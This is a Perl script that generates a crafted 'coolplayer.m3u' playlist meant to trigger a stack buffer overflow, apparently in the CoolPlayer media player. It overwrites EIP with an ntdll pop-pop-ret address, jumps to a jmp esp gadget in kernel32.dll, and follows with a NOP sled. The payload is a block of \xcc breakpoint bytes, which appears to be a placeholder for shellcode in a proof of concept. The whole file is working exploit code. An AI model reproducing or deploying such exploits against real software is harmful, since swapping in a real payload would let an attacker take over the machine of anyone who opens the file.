#!/usr/bin/perl

my $buffsize = 10000; # set consistent buffer size
my $junk = "\x4A" x 218; # simulate unusable address containing junk with 'J'
my $eip = pack('V',0x7C924961); # EIP overwrite w/ pop edi pop esi pop ebp from ntdll
my $junk2 = "\x4A" x 12; # simulate unusable address containing junk with 'J'
my $usable_address = pack('V',0x7C86467B); # jmp esp kernel32.dll
my $nops = "\x90" x 20;
 
my $shell = "\xcc" x 500;
 
my $sploit = $junk.$eip.$junk2.$usable_address.$nops.$shell; # build sploit portion of buffer
print "Usable: " . length($sploit) . "\n";
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer
print "Usable: " . length($fill) . "\n";
my $buffer = $sploit.$fill; # build final buffer
 
# write the exploit buffer to file
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n";